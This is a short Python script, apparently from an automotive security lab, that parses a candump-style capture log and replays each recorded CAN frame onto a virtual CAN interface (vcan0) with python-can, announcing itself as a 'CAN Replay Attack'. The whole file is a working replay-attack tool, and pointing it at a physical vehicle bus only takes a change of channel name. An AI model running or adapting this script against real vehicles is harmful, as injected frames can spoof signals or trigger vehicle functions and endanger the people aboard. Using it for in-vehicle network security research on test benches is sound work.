import can
import time
import re

bus = can.interface.Bus(
    channel="vcan0",
    interface="socketcan"
)

LOG_FILE = "logs/capture.log"

print("[+] CAN Replay Attack Started")

with open(LOG_FILE, "r") as f:

    lines = f.readlines()

for line in lines:

    line = line.strip()

    match = re.search(
        r'vcan0\s+([0-9A-Fa-f]+)#([0-9A-Fa-f]*)',
        line
    )

    if not match:
        continue

    can_id = int(
        match.group(1),
        16
    )

    data_hex = match.group(2)

    data = bytes.fromhex(
        data_hex
    )

    msg = can.Message(
        arbitration_id=can_id,
        data=data,
        is_extended_id=False
    )

    bus.send(msg)

    print(
        f"[REPLAY] "
        f"ID=0x{can_id:X} "
        f"DATA={data_hex}"
    )

    time.sleep(0.1)

print("[+] Replay Complete")